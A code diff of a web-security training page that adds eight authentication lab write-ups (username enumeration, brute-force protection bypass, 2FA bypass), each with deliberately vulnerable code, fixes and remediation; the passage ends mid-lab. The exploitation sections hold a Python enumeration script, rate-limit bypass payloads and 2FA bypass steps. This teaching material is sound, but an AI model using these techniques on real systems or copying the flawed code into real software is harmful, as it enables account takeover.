@@ -758,22 +758,22 @@
 
             <div class="sidebar-section">
                 <div class="sidebar-title">Username Enumeration</div>
-                <div class="lab-item coming-soon" data-lab="username-enum-different">
+                <div class="lab-item" data-lab="username-enum-different">
                     <i class="fas fa-user-secret"></i>
                     <span class="lab-name">Via Different Responses</span>
                     <span class="difficulty apprentice">Apprentice</span>
                 </div>
-                <div class="lab-item coming-soon" data-lab="username-enum-subtle">
+                <div class="lab-item" data-lab="username-enum-subtle">
                     <i class="fas fa-user-secret"></i>
                     <span class="lab-name">Via Subtle Differences</span>
                     <span class="difficulty practitioner">Practitioner</span>
                 </div>
-                <div class="lab-item coming-soon" data-lab="username-enum-timing">
+                <div class="lab-item" data-lab="username-enum-timing">
                     <i class="fas fa-clock"></i>
                     <span class="lab-name">Via Response Timing</span>
                     <span class="difficulty practitioner">Practitioner</span>
                 </div>
-                <div class="lab-item coming-soon" data-lab="username-enum-lock">
+                <div class="lab-item" data-lab="username-enum-lock">
                     <i class="fas fa-lock"></i>
                     <span class="lab-name">Via Account Lock</span>
                     <span class="difficulty practitioner">Practitioner</span>
@@ -782,12 +782,12 @@
 
             <div class="sidebar-section">
                 <div class="sidebar-title">Brute-Force Protection</div>
-                <div class="lab-item coming-soon" data-lab="bruteforce-ip-block">
+                <div class="lab-item" data-lab="bruteforce-ip-block">
                     <i class="fas fa-ban"></i>
                     <span class="lab-name">IP Block Bypass</span>
                     <span class="difficulty practitioner">Practitioner</span>
                 </div>
-                <div class="lab-item coming-soon" data-lab="bruteforce-multiple-creds">
+                <div class="lab-item" data-lab="bruteforce-multiple-creds">
                     <i class="fas fa-list"></i>
                     <span class="lab-name">Multiple Credentials</span>
                     <span class="difficulty expert">Expert</span>
@@ -796,17 +796,17 @@
 
             <div class="sidebar-section">
                 <div class="sidebar-title">2FA Bypass</div>
-                <div class="lab-item coming-soon" data-lab="2fa-simple">
+                <div class="lab-item" data-lab="2fa-simple">
                     <i class="fas fa-mobile-alt"></i>
                     <span class="lab-name">Simple 2FA Bypass</span>
                     <span class="difficulty apprentice">Apprentice</span>
                 </div>
-                <div class="lab-item coming-soon" data-lab="2fa-broken-logic">
+                <div class="lab-item" data-lab="2fa-broken-logic">
                     <i class="fas fa-bug"></i>
                     <span class="lab-name">Broken 2FA Logic</span>
                     <span class="difficulty practitioner">Practitioner</span>
                 </div>
-                <div class="lab-item coming-soon" data-lab="2fa-bruteforce">
+                <div class="lab-item" data-lab="2fa-bruteforce">
                     <i class="fas fa-hammer"></i>
                     <span class="lab-name">2FA Brute-Force</span>
                     <span class="difficulty expert">Expert</span>
@@ -815,12 +815,12 @@
 
             <div class="sidebar-section">
                 <div class="sidebar-title">Session & Cookies</div>
-                <div class="lab-item coming-soon" data-lab="stay-logged-in">
+                <div class="lab-item" data-lab="stay-logged-in">
                     <i class="fas fa-cookie"></i>
                     <span class="lab-name">Stay-Logged-In Cookie</span>
                     <span class="difficulty practitioner">Practitioner</span>
                 </div>
-                <div class="lab-item coming-soon" data-lab="offline-cracking">
+                <div class="lab-item" data-lab="offline-cracking">
                     <i class="fas fa-database"></i>
                     <span class="lab-name">Offline Password Cracking</span>
                     <span class="difficulty practitioner">Practitioner</span>
@@ -829,12 +829,12 @@
 
             <div class="sidebar-section">
                 <div class="sidebar-title">Password Reset</div>
-                <div class="lab-item coming-soon" data-lab="reset-broken-logic">
+                <div class="lab-item" data-lab="reset-broken-logic">
                     <i class="fas fa-undo"></i>
                     <span class="lab-name">Broken Reset Logic</span>
                     <span class="difficulty apprentice">Apprentice</span>
                 </div>
-                <div class="lab-item coming-soon" data-lab="reset-poisoning">
+                <div class="lab-item" data-lab="reset-poisoning">
                     <i class="fas fa-skull-crossbones"></i>
                     <span class="lab-name">Reset Poisoning</span>
                     <span class="difficulty practitioner">Practitioner</span>
@@ -857,6 +857,986 @@
         </div>
 
         <div class="content-area">
+            <!-- Lab 1: Username Enumeration via Different Responses -->
+            <div id="username-enum-different" class="lab-content hidden">
+                <div class="lab-header">
+                    <h2><i class="fas fa-user-secret"></i> Lab 1: Username Enumeration via Different Responses</h2>
+                    <div class="lab-meta">
+                        <div class="meta-item">
+                            <i class="fas fa-layer-group"></i>
+                            <span>PortSwigger Web Security Academy</span>
+                        </div>
+                        <div class="meta-item">
+                            <i class="fas fa-signal"></i>
+                            <span>Difficulty: Apprentice</span>
+                        </div>
+                        <div class="meta-item">
+                            <i class="fas fa-tag"></i>
+                            <span>Username Enumeration</span>
+                        </div>
+                    </div>
+                    <p class="lab-description">
+                        This lab is vulnerable to username enumeration. The application returns different error messages
+                        depending on whether the username exists or not, allowing attackers to build a list of valid usernames
+                        before attempting password brute-force attacks.
+                    </p>
+                </div>
+
+                <!-- Vulnerability Explanation -->
+                <div class="vuln-section">
+                    <h3><i class="fas fa-bug"></i> The Vulnerability</h3>
+                    <ul class="vuln-list">
+                        <li>Login form returns <strong>"Invalid username"</strong> when username doesn't exist</li>
+                        <li>Login form returns <strong>"Incorrect password"</strong> when username exists but password is wrong</li>
+                        <li>This difference allows attackers to enumerate valid usernames</li>
+                        <li>Once valid usernames are known, targeted password attacks become feasible</li>
+                        <li>No rate limiting allows rapid enumeration of username lists</li>
+                    </ul>
+                </div>
+
+                <!-- Code Review Section -->
+                <div class="code-review-section">
+                    <h3 style="margin-bottom: 15px; color: var(--text-primary);"><i class="fas fa-code" style="color: var(--accent-purple);"></i> Vulnerable Code Review</h3>
+
+                    <div class="code-tabs">
+                        <button class="code-tab active" data-view="vulnerable" data-lab="lab1">
+                            <i class="fas fa-exclamation-triangle"></i> Vulnerable Code
+                        </button>
+                        <button class="code-tab secure" data-view="secure" data-lab="lab1">
+                            <i class="fas fa-shield-alt"></i> Secure Code
+                        </button>
+                    </div>
+
+                    <!-- Vulnerable Code -->
+                    <div class="code-container" id="lab1-vulnerable">
+                        <div class="code-header">
+                            <div class="code-filename">
+                                <i class="fab fa-python"></i>
+                                <span>login_controller.py</span>
+                            </div>
+                        </div>
+                        <div class="code-block">
+                            <pre><code class="language-python">@app.route('/login', methods=['POST'])
+def login():
+    username = request.form.get('username')
+    password = request.form.get('password')
+
+    # Fetch user from database
+    user = User.query.filter_by(username=username).first()
+
+    # VULNERABILITY: Different error messages reveal username validity
+<span class="vuln-line">    if not user:</span>
+<span class="vuln-line">        return render_template('login.html', </span>
+<span class="vuln-line">                               error='Invalid username')  # ❌ Reveals username doesn't exist</span>
+
+<span class="vuln-line">    if not check_password_hash(user.password, password):</span>
+<span class="vuln-line">        return render_template('login.html',</span>
+<span class="vuln-line">                               error='Incorrect password')  # ❌ Confirms username EXISTS</span>
+
+    # Login successful
+    session['user_id'] = user.id
+    return redirect('/dashboard')</code></pre>
+                        </div>
+                    </div>
+
+                    <!-- Secure Code -->
+                    <div class="code-container hidden" id="lab1-secure">
+                        <div class="code-header">
+                            <div class="code-filename">
+                                <i class="fab fa-python"></i>
+                                <span>login_controller.py (Secure)</span>
+                            </div>
+                        </div>
+                        <div class="code-block">
+                            <pre><code class="language-python">@app.route('/login', methods=['POST'])
+@limiter.limit("5 per minute")
+def login():
+    username = request.form.get('username')
+    password = request.form.get('password')
+
+    user = User.query.filter_by(username=username).first()
+
+    # ✅ FIX: Use identical error message for all failures
+<span class="secure-line">    # Always perform password check to prevent timing attacks</span>
+<span class="secure-line">    if user:</span>
+<span class="secure-line">        password_valid = check_password_hash(user.password, password)</span>
+<span class="secure-line">    else:</span>
+<span class="secure-line">        # Perform dummy hash to maintain consistent timing</span>
+<span class="secure-line">        check_password_hash(DUMMY_HASH, password)</span>
+<span class="secure-line">        password_valid = False</span>
+
+<span class="secure-line">    if not user or not password_valid:</span>
+<span class="secure-line">        log_failed_login(username, request.remote_addr)</span>
+<span class="secure-line">        return render_template('login.html',</span>
+<span class="secure-line">                               error='Invalid username or password')  # ✅ Generic message</span>
+
+    session['user_id'] = user.id
+    return redirect('/dashboard')</code></pre>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Attack Flow -->
+                <div class="attack-flow">
+                    <h3><i class="fas fa-route"></i> Attack Flow</h3>
+                    <div class="flow-steps">
+                        <div class="flow-step">
+                            <div class="step-number">1</div>
+                            <div class="step-content">
+                                <h4>Intercept Login Request</h4>
+                                <p>Capture a login POST request using Burp Suite proxy.</p>
+                            </div>
+                        </div>
+                        <div class="flow-step">
+                            <div class="step-number">2</div>
+                            <div class="step-content">
+                                <h4>Send to Intruder</h4>
+                                <p>Mark the <code>username</code> parameter as the payload position. Use a wordlist of common usernames.</p>
+                            </div>
+                        </div>
+                        <div class="flow-step">
+                            <div class="step-number">3</div>
+                            <div class="step-content">
+                                <h4>Analyze Responses</h4>
+                                <p>Filter by response containing <code>"Incorrect password"</code> - these are valid usernames!</p>
+                            </div>
+                        </div>
+                        <div class="flow-step">
+                            <div class="step-number">4</div>
+                            <div class="step-content">
+                                <h4>Brute-Force Password</h4>
+                                <p>Use discovered username to perform targeted password attack.</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Payloads -->
+                <div class="payload-section">
+                    <h3><i class="fas fa-code"></i> Attack Payloads</h3>
+                    <div class="payload-box">
+                        <span class="payload-label">Burp Intruder Grep Match</span>
+# Response indicating VALID username:
+"Incorrect password"
+
+# Response indicating INVALID username:
+"Invalid username"
+                    </div>
+                    <div class="payload-box">
+                        <span class="payload-label">Python Enumeration Script</span>
+import requests
+
+url = "https://target.com/login"
+usernames = open('usernames.txt').read().splitlines()
+valid_users = []
+
+for username in usernames:
+    data = {'username': username, 'password': 'test123'}
+    response = requests.post(url, data=data)
+
+    if 'Incorrect password' in response.text:
+        print(f'[+] Valid username: {username}')
+        valid_users.append(username)
+    elif 'Invalid username' in response.text:
+        print(f'[-] Invalid: {username}')
+                    </div>
+                </div>
+
+                <!-- Remediation -->
+                <div class="remediation-section">
+                    <h3><i class="fas fa-shield-alt"></i> Remediation</h3>
+                    <div class="remediation-list">
+                        <div class="remediation-item">
+                            <i class="fas fa-check-circle"></i>
+                            <p><strong>Generic Error Messages:</strong> Use "Invalid username or password" for all authentication failures.</p>
+                        </div>
+                        <div class="remediation-item">
+                            <i class="fas fa-check-circle"></i>
+                            <p><strong>Consistent Timing:</strong> Always perform password hash comparison to prevent timing-based enumeration.</p>
+                        </div>
+                        <div class="remediation-item">
+                            <i class="fas fa-check-circle"></i>
+                            <p><strong>Rate Limiting:</strong> Implement progressive delays or CAPTCHA after failed attempts.</p>
+                        </div>
+                        <div class="remediation-item">
+                            <i class="fas fa-check-circle"></i>
+                            <p><strong>Account Lockout:</strong> Temporarily lock accounts after multiple failed login attempts.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Lab 2: Username Enumeration via Subtly Different Responses -->
+            <div id="username-enum-subtle" class="lab-content hidden">
+                <div class="lab-header">
+                    <h2><i class="fas fa-user-secret"></i> Lab 2: Username Enumeration via Subtly Different Responses</h2>
+                    <div class="lab-meta">
+                        <div class="meta-item"><i class="fas fa-layer-group"></i><span>PortSwigger Web Security Academy</span></div>
+                        <div class="meta-item"><i class="fas fa-signal"></i><span>Difficulty: Practitioner</span></div>
+                        <div class="meta-item"><i class="fas fa-tag"></i><span>Username Enumeration</span></div>
+                    </div>
+                    <p class="lab-description">
+                        This lab has a subtle difference in error messages - a trailing period or space. Attackers must carefully compare responses
+                        to identify valid usernames through minor text variations.
+                    </p>
+                </div>
+
+                <div class="vuln-section">
+                    <h3><i class="fas fa-bug"></i> The Vulnerability</h3>
+                    <ul class="vuln-list">
+                        <li>Invalid username returns: <code>"Invalid username or password."</code> (with period)</li>
+                        <li>Valid username returns: <code>"Invalid username or password"</code> (no period)</li>
+                        <li>Subtle differences like trailing spaces, punctuation, or HTML whitespace</li>
+                        <li>Response length differs by 1-2 bytes - easy to miss without tools</li>
+                    </ul>
+                </div>
+
+                <div class="code-review-section">
+                    <h3 style="margin-bottom: 15px; color: var(--text-primary);"><i class="fas fa-code" style="color: var(--accent-purple);"></i> Vulnerable Code Review</h3>
+                    <div class="code-tabs">
+                        <button class="code-tab active" data-view="vulnerable" data-lab="lab2"><i class="fas fa-exclamation-triangle"></i> Vulnerable Code</button>
+                        <button class="code-tab secure" data-view="secure" data-lab="lab2"><i class="fas fa-shield-alt"></i> Secure Code</button>
+                    </div>
+                    <div class="code-container" id="lab2-vulnerable">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>auth.py</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-python">@app.route('/login', methods=['POST'])
+def login():
+    username = request.form.get('username')
+    password = request.form.get('password')
+
+    user = User.query.filter_by(username=username).first()
+
+    # VULNERABILITY: Subtle difference in error messages
+<span class="vuln-line">    if not user:</span>
+<span class="vuln-line">        # Note the period at the end!</span>
+<span class="vuln-line">        return jsonify({'error': 'Invalid username or password.'}), 401</span>
+
+<span class="vuln-line">    if not verify_password(user.password, password):</span>
+<span class="vuln-line">        # No period here - subtle but exploitable!</span>
+<span class="vuln-line">        return jsonify({'error': 'Invalid username or password'}), 401</span>
+
+    return jsonify({'success': True, 'token': generate_token(user)})</code></pre>
+                        </div>
+                    </div>
+                    <div class="code-container hidden" id="lab2-secure">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>auth.py (Secure)</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-python"># ✅ Define error message as constant
+<span class="secure-line">AUTH_ERROR_MSG = 'Invalid username or password'</span>
+
+@app.route('/login', methods=['POST'])
+@limiter.limit("5 per minute")
+def login():
+    username = request.form.get('username')
+    password = request.form.get('password')
+
+    user = User.query.filter_by(username=username).first()
+
+    # ✅ FIX: Use same constant for ALL error responses
+<span class="secure-line">    if user:</span>
+<span class="secure-line">        password_valid = verify_password(user.password, password)</span>
+<span class="secure-line">    else:</span>
+<span class="secure-line">        verify_password(DUMMY_HASH, password)  # Timing protection</span>
+<span class="secure-line">        password_valid = False</span>
+
+<span class="secure-line">    if not user or not password_valid:</span>
+<span class="secure-line">        return jsonify({'error': AUTH_ERROR_MSG}), 401  # ✅ Consistent</span>
+
+    return jsonify({'success': True, 'token': generate_token(user)})</code></pre>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="attack-flow">
+                    <h3><i class="fas fa-route"></i> Attack Flow</h3>
+                    <div class="flow-steps">
+                        <div class="flow-step"><div class="step-number">1</div><div class="step-content"><h4>Capture Login Request</h4><p>Intercept POST request to /login endpoint.</p></div></div>
+                        <div class="flow-step"><div class="step-number">2</div><div class="step-content"><h4>Send to Intruder</h4><p>Set username as payload position with wordlist.</p></div></div>
+                        <div class="flow-step"><div class="step-number">3</div><div class="step-content"><h4>Compare Response Lengths</h4><p>Sort by response length - valid usernames will have slightly different byte count.</p></div></div>
+                        <div class="flow-step"><div class="step-number">4</div><div class="step-content"><h4>Identify Valid Username</h4><p>The response with different length contains the valid username.</p></div></div>
+                    </div>
+                </div>
+
+                <div class="payload-section">
+                    <h3><i class="fas fa-code"></i> Detection Tips</h3>
+                    <div class="payload-box">
+                        <span class="payload-label">Burp Comparer Method</span>
+# 1. Send two requests with different usernames
+# 2. Right-click responses > Send to Comparer
+# 3. Look for subtle differences:
+#    - Trailing periods, spaces, or newlines
+#    - Different HTML whitespace
+#    - Capitalization differences
+                    </div>
+                </div>
+
+                <div class="remediation-section">
+                    <h3><i class="fas fa-shield-alt"></i> Remediation</h3>
+                    <div class="remediation-list">
+                        <div class="remediation-item"><i class="fas fa-check-circle"></i><p><strong>Use Constants:</strong> Define error messages as constants and reuse them everywhere.</p></div>
+                        <div class="remediation-item"><i class="fas fa-check-circle"></i><p><strong>Code Review:</strong> Review all authentication paths for message consistency.</p></div>
+                        <div class="remediation-item"><i class="fas fa-check-circle"></i><p><strong>Automated Testing:</strong> Add tests that verify identical responses for auth failures.</p></div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Lab 3: Username Enumeration via Response Timing -->
+            <div id="username-enum-timing" class="lab-content hidden">
+                <div class="lab-header">
+                    <h2><i class="fas fa-clock"></i> Lab 3: Username Enumeration via Response Timing</h2>
+                    <div class="lab-meta">
+                        <div class="meta-item"><i class="fas fa-layer-group"></i><span>PortSwigger Web Security Academy</span></div>
+                        <div class="meta-item"><i class="fas fa-signal"></i><span>Difficulty: Practitioner</span></div>
+                    </div>
+                    <p class="lab-description">
+                        The application performs expensive password validation only when the username exists.
+                        Valid usernames cause longer response times due to bcrypt/password hashing operations.
+                    </p>
+                </div>
+                <div class="vuln-section">
+                    <h3><i class="fas fa-bug"></i> The Vulnerability</h3>
+                    <ul class="vuln-list">
+                        <li>Password hashing (bcrypt/scrypt) is computationally expensive</li>
+                        <li>Application only hashes password if username exists in database</li>
+                        <li>Valid username: ~500ms response (hash computed)</li>
+                        <li>Invalid username: ~50ms response (no hash computed)</li>
+                        <li>Use very long password to amplify timing difference</li>
+                    </ul>
+                </div>
+                <div class="code-review-section">
+                    <h3 style="margin-bottom: 15px; color: var(--text-primary);"><i class="fas fa-code" style="color: var(--accent-purple);"></i> Vulnerable Code</h3>
+                    <div class="code-container">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>auth.py</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-python">@app.route('/login', methods=['POST'])
+def login():
+    username = request.form.get('username')
+    password = request.form.get('password')
+
+    user = User.query.filter_by(username=username).first()
+
+<span class="vuln-line">    if not user:</span>
+<span class="vuln-line">        # ❌ Returns immediately - no password hash computed!</span>
+<span class="vuln-line">        return error_response('Invalid credentials')</span>
+
+<span class="vuln-line">    # ❌ bcrypt.check() is SLOW (~100-500ms)</span>
+<span class="vuln-line">    # Only executed for valid usernames!</span>
+<span class="vuln-line">    if not bcrypt.check_password_hash(user.password, password):</span>
+        return error_response('Invalid credentials')
+
+    return success_response(user)</code></pre>
+                        </div>
+                    </div>
+                </div>
+                <div class="payload-section">
+                    <h3><i class="fas fa-code"></i> Exploitation</h3>
+                    <div class="payload-box">
+                        <span class="payload-label">Burp Intruder Setup</span>
+# 1. Use a VERY LONG password (200+ chars) to amplify timing
+# 2. Add "Response received" column in Intruder
+# 3. Sort by response time
+# 4. Valid usernames will have significantly longer response times
+
+X-Forwarded-For: §1.1.1.1§  # Bypass IP rate limiting
+username=§admin§&password=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
+                    </div>
+                </div>
+                <div class="remediation-section">
+                    <h3><i class="fas fa-shield-alt"></i> Remediation</h3>
+                    <div class="remediation-list">
+                        <div class="remediation-item"><i class="fas fa-check-circle"></i><p><strong>Always Hash:</strong> Perform dummy password hash even for non-existent users.</p></div>
+                        <div class="remediation-item"><i class="fas fa-check-circle"></i><p><strong>Constant Time:</strong> Use constant-time comparison functions.</p></div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Lab 4: Username Enumeration via Account Lock -->
+            <div id="username-enum-lock" class="lab-content hidden">
+                <div class="lab-header">
+                    <h2><i class="fas fa-lock"></i> Lab 4: Username Enumeration via Account Lock</h2>
+                    <div class="lab-meta">
+                        <div class="meta-item"><i class="fas fa-layer-group"></i><span>PortSwigger Web Security Academy</span></div>
+                        <div class="meta-item"><i class="fas fa-signal"></i><span>Difficulty: Practitioner</span></div>
+                    </div>
+                    <p class="lab-description">
+                        The account lockout mechanism reveals valid usernames. When too many failed attempts occur
+                        for a valid user, the response changes to indicate the account is locked.
+                    </p>
+                </div>
+                <div class="vuln-section">
+                    <h3><i class="fas fa-bug"></i> The Vulnerability</h3>
+                    <ul class="vuln-list">
+                        <li>Invalid username: Always returns "Invalid credentials"</li>
+                        <li>Valid username after lockout: Returns "Account locked" or similar</li>
+                        <li>Lockout only triggers for existing accounts</li>
+                        <li>Send 5+ requests per username to trigger lockout message</li>
+                    </ul>
+                </div>
+                <div class="code-review-section">
+                    <h3 style="margin-bottom: 15px; color: var(--text-primary);"><i class="fas fa-code" style="color: var(--accent-purple);"></i> Vulnerable Code</h3>
+                    <div class="code-container">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>auth.py</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-python">@app.route('/login', methods=['POST'])
+def login():
+    username = request.form.get('username')
+    password = request.form.get('password')
+
+    user = User.query.filter_by(username=username).first()
+
+    if not user:
+        return error('Invalid credentials')
+
+<span class="vuln-line">    # ❌ Lockout check only for EXISTING users!</span>
+<span class="vuln-line">    if user.failed_attempts >= 5:</span>
+<span class="vuln-line">        return error('Account locked. Try again in 1 minute.')  # ❌ Reveals valid user!</span>
+
+    if not verify_password(user.password, password):
+        user.failed_attempts += 1
+        db.session.commit()
+        return error('Invalid credentials')
+
+    user.failed_attempts = 0
+    return success(user)</code></pre>
+                        </div>
+                    </div>
+                </div>
+                <div class="payload-section">
+                    <h3><i class="fas fa-code"></i> Exploitation</h3>
+                    <div class="payload-box">
+                        <span class="payload-label">Cluster Bomb Attack</span>
+# Payload 1: Username list
+# Payload 2: Null payloads (repeat 5-10 times per username)
+
+# Grep for: "Account locked" or "too many attempts"
+# These responses indicate VALID usernames!
+                    </div>
+                </div>
+            </div>
+
+            <!-- Lab 5: Broken Brute-Force Protection - IP Block -->
+            <div id="bruteforce-ip-block" class="lab-content hidden">
+                <div class="lab-header">
+                    <h2><i class="fas fa-ban"></i> Lab 5: Broken Brute-Force Protection - IP Block</h2>
+                    <div class="lab-meta">
+                        <div class="meta-item"><i class="fas fa-layer-group"></i><span>PortSwigger Web Security Academy</span></div>
+                        <div class="meta-item"><i class="fas fa-signal"></i><span>Difficulty: Practitioner</span></div>
+                    </div>
+                    <p class="lab-description">
+                        The IP-based rate limiting resets after a successful login. Attackers can bypass
+                        brute-force protection by alternating between valid and invalid credentials.
+                    </p>
+                </div>
+                <div class="vuln-section">
+                    <h3><i class="fas fa-bug"></i> The Vulnerability</h3>
+                    <ul class="vuln-list">
+                        <li>Failed login counter resets on successful login</li>
+                        <li>Counter is per-IP, not per-account</li>
+                        <li>Attacker can login with own valid creds between brute-force attempts</li>
+                        <li>Pattern: try victim password → login as self → repeat</li>
+                    </ul>
+                </div>
+                <div class="code-review-section">
+                    <h3 style="margin-bottom: 15px; color: var(--text-primary);"><i class="fas fa-code" style="color: var(--accent-purple);"></i> Vulnerable Code</h3>
+                    <div class="code-container">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>rate_limiter.py</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-python">def check_rate_limit(ip_address):
+    attempts = get_failed_attempts(ip_address)
+    if attempts >= 3:
+        raise RateLimitError("Too many failed attempts")
+
+def login(username, password, ip_address):
+    check_rate_limit(ip_address)
+
+    if authenticate(username, password):
+<span class="vuln-line">        # ❌ Resets counter for the IP on ANY successful login</span>
+<span class="vuln-line">        reset_failed_attempts(ip_address)</span>
+        return success()
+    else:
+        increment_failed_attempts(ip_address)
+        return failure()</code></pre>
+                        </div>
+                    </div>
+                </div>
+                <div class="payload-section">
+                    <h3><i class="fas fa-code"></i> Exploitation</h3>
+                    <div class="payload-box">
+                        <span class="payload-label">Pitchfork Attack Payload</span>
+# Alternate between victim and attacker credentials:
+carlos:password1
+wiener:peter    # Valid login - resets counter!
+carlos:password2
+wiener:peter    # Reset again
+carlos:password3
+wiener:peter
+...
+                    </div>
+                </div>
+            </div>
+
+            <!-- Lab 6: Broken Brute-Force Protection - Multiple Credentials -->
+            <div id="bruteforce-multiple-creds" class="lab-content hidden">
+                <div class="lab-header">
+                    <h2><i class="fas fa-list"></i> Lab 6: Broken Brute-Force Protection - Multiple Credentials</h2>
+                    <div class="lab-meta">
+                        <div class="meta-item"><i class="fas fa-layer-group"></i><span>PortSwigger Web Security Academy</span></div>
+                        <div class="meta-item"><i class="fas fa-signal"></i><span>Difficulty: Expert</span></div>
+                    </div>
+                    <p class="lab-description">
+                        The login endpoint accepts JSON arrays of credentials, allowing attackers to test
+                        multiple passwords in a single request, bypassing per-request rate limiting.
+                    </p>
+                </div>
+                <div class="vuln-section">
+                    <h3><i class="fas fa-bug"></i> The Vulnerability</h3>
+                    <ul class="vuln-list">
+                        <li>API accepts array of credentials in single request</li>
+                        <li>Rate limiting counts requests, not credential attempts</li>
+                        <li>Send 100 passwords in one request = 1 "attempt"</li>
+                        <li>Bypasses most rate limiting implementations</li>
+                    </ul>
+                </div>
+                <div class="code-review-section">
+                    <h3 style="margin-bottom: 15px; color: var(--text-primary);"><i class="fas fa-code" style="color: var(--accent-purple);"></i> Vulnerable Code</h3>
+                    <div class="code-container">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-node-js"></i><span>auth.js</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-javascript">app.post('/login', rateLimit({ max: 5 }), (req, res) => {
+    const { username, password } = req.body;
+
+<span class="vuln-line">    // ❌ Accepts arrays without validation!</span>
+<span class="vuln-line">    const passwords = Array.isArray(password) ? password : [password];</span>
+
+<span class="vuln-line">    for (const pwd of passwords) {</span>
+<span class="vuln-line">        if (authenticate(username, pwd)) {</span>
+<span class="vuln-line">            return res.json({ success: true });</span>
+<span class="vuln-line">        }</span>
+<span class="vuln-line">    }</span>
+
+    res.status(401).json({ error: 'Invalid credentials' });
+});</code></pre>
+                        </div>
+                    </div>
+                </div>
+                <div class="payload-section">
+                    <h3><i class="fas fa-code"></i> Exploitation</h3>
+                    <div class="payload-box">
+                        <span class="payload-label">JSON Array Payload</span>
+POST /login HTTP/1.1
+Content-Type: application/json
+
+{
+    "username": "carlos",
+    "password": [
+        "123456", "password", "admin", "letmein",
+        "welcome", "monkey", "dragon", "master",
+        ... // 100+ passwords in single request!
+    ]
+}
+                    </div>
+                </div>
+            </div>
+
+            <!-- Lab 7: 2FA Simple Bypass -->
+            <div id="2fa-simple" class="lab-content hidden">
+                <div class="lab-header">
+                    <h2><i class="fas fa-mobile-alt"></i> Lab 7: 2FA Simple Bypass</h2>
+                    <div class="lab-meta">
+                        <div class="meta-item"><i class="fas fa-layer-group"></i><span>PortSwigger Web Security Academy</span></div>
+                        <div class="meta-item"><i class="fas fa-signal"></i><span>Difficulty: Apprentice</span></div>
+                    </div>
+                    <p class="lab-description">
+                        The 2FA verification page can be skipped by directly navigating to the post-login page.
+                        The application doesn't verify that 2FA was completed before granting access.
+                    </p>
+                </div>
+                <div class="vuln-section">
+                    <h3><i class="fas fa-bug"></i> The Vulnerability</h3>
+                    <ul class="vuln-list">
+                        <li>After password login, user redirected to /login2 for 2FA code</li>
+                        <li>Session is marked as "partially authenticated" after password</li>
+                        <li>Protected pages don't verify 2FA completion status</li>
+                        <li>Simply navigate to /my-account to bypass 2FA entirely!</li>
+                    </ul>
+                </div>
+                <div class="code-review-section">
+                    <h3 style="margin-bottom: 15px; color: var(--text-primary);"><i class="fas fa-code" style="color: var(--accent-purple);"></i> Vulnerable Code</h3>
+                    <div class="code-container">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>auth.py</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-python">@app.route('/login', methods=['POST'])
+def login():
+    if authenticate(username, password):
+<span class="vuln-line">        session['user_id'] = user.id  # ❌ Session created before 2FA!</span>
+        return redirect('/login2')  # 2FA page
+
+@app.route('/my-account')
+def my_account():
+<span class="vuln-line">    # ❌ Only checks if user_id exists, not 2FA completion!</span>
+<span class="vuln-line">    if 'user_id' not in session:</span>
+<span class="vuln-line">        return redirect('/login')</span>
+    return render_template('account.html')</code></pre>
+                        </div>
+                    </div>
+                </div>
+                <div class="payload-section">
+                    <h3><i class="fas fa-code"></i> Exploitation</h3>
+                    <div class="payload-box">
+                        <span class="payload-label">Bypass Steps</span>
+1. Login with valid credentials → redirected to /login2
+2. Don't enter 2FA code
+3. Manually change URL to /my-account
+4. Access granted without 2FA!
+                    </div>
+                </div>
+            </div>
+
+            <!-- Lab 8: 2FA Broken Logic -->
+            <div id="2fa-broken-logic" class="lab-content hidden">
+                <div class="lab-header">
+                    <h2><i class="fas fa-bug"></i> Lab 8: 2FA Broken Logic</h2>
+                    <div class="lab-meta">
+                        <div class="meta-item"><i class="fas fa-layer-group"></i><span>PortSwigger Web Security Academy</span></div>
+                        <div class="meta-item"><i class="fas fa-signal"></i><span>Difficulty: Practitioner</span></div>
+                    </div>
+                    <p class="lab-description">
+                        The 2FA verification uses a user-controllable parameter to determine which account's code to verify,
+                        allowing attackers to bypass 2FA for any account.
+                    </p>
+                </div>
+                <div class="vuln-section">
+                    <h3><i class="fas fa-bug"></i> The Vulnerability</h3>
+                    <ul class="vuln-list">
+                        <li>2FA verification form includes a <code>verify</code> cookie or hidden field</li>
+                        <li>This parameter determines which user's 2FA code to verify</li>
+                        <li>Attacker can change parameter to victim's username</li>
+                        <li>Brute-force 4-digit code (0000-9999) for victim account</li>
+                    </ul>
+                </div>
+                <div class="code-review-section">
+                    <h3 style="margin-bottom: 15px; color: var(--text-primary);"><i class="fas fa-code" style="color: var(--accent-purple);"></i> Vulnerable Code</h3>
+                    <div class="code-container">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>auth.py</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-python">@app.route('/login2', methods=['POST'])
+def verify_2fa():
+<span class="vuln-line">    # ❌ Username from cookie - user-controllable!</span>
+<span class="vuln-line">    username = request.cookies.get('verify')</span>
+    code = request.form.get('mfa-code')
+
+    user = User.query.filter_by(username=username).first()
+
+    if user and user.mfa_code == code:
+        session['user_id'] = user.id
+<span class="vuln-line">        session['2fa_complete'] = True  # ❌ Attacker gets access to victim!</span>
+        return redirect('/my-account')
+
+    return error('Invalid code')</code></pre>
+                        </div>
+                    </div>
+                </div>
+                <div class="payload-section">
+                    <h3><i class="fas fa-code"></i> Exploitation</h3>
+                    <div class="payload-box">
